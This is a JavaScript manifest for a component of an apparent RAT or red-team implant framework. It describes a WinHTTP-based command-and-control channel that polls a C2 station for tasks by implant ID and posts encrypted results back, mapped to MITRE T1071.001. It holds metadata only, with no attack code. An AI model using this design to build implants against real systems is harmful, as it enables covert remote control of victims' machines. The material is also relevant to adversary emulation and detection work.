const manifest = {
  "title": "HTTP WinHTTP Channel",
  "component_type": "channel",
  "author": "ph3eds",
  "description": "WinHTTP-based C2 channel. GET /?id=<rat_id> polls for tasks; POST / submits encrypted output. No reqwest/tokio dependency.",
  "mitre": [
    "T1071.001"
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1071/001/"
  ],
  "parameters": [
    {
      "name": "station",
      "placeholder": "{{STATION}}",
      "type": "",
      "description": "C2 station base URL (e.g. http://10.0.0.1:3000)",
      "default": ""
    }
  ],
  "cargo_deps": {
    "windows": {
      "version": "0.58",
      "features": [
        "Win32_Networking_WinHttp",
        "Win32_Foundation",
        "Win32_System_LibraryLoader"
      ]
    }
  }
}
export { manifest }
